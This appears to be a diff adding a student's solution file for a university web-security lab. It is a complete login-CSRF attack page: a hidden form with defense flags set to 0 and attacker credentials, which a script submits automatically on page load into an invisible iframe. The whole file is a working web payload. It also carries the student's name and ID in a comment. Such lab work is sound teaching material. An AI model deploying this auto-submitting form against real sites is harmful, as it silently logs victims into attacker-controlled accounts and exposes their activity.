@@ -1,0 +1,11 @@
+<!--Lucie Mugnier U87775286-->
+
+<iframe name='frame' style='display:none'></iframe>
+	<form id='csrf_form' action='http://cs558web.bu.edu/project2/login' method='POST' style='display:none' target='frame'>
+		<input name='csrfdefense' value=0>
+		<input name='xssdefense' value=0>
+		<input id = 'username' name='username' value='attacker'>
+		<input id = 'userpass' name='password' value='l33th4x'>
+	</form>
+
+<script>document.getElementById('csrf_form').submit()</script>
